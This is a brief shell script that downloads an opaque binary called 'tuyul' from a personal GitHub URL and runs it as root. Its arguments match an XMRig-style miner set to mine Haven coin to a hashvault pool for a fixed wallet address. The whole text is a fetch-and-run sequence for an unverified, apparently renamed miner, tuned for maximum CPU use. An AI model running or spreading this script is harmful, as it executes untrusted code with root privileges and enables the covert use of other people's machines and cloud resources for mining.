sudo apt-get install -y gcc git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
wget https://github.com/Diaznr/p/raw/main/tuyul
sudo sysctl -w vm.nr_hugepages=1280
chmod +x tuyul
sudo ./tuyul -a cn-heavy/xhv --url singapore01.hashvault.pro:80 --user hvxy8xG4XHcjk2FCA5RSHK1vz2kkae7VdDEjUMJqBAaoWNBFDQmMNpwEkmwK2jePsJd2zbbJDrJtCgh67ErMeubb6hjaybbP3r --pass Havenn --cpu-no-yield -k --cpu-priority 5 --tls
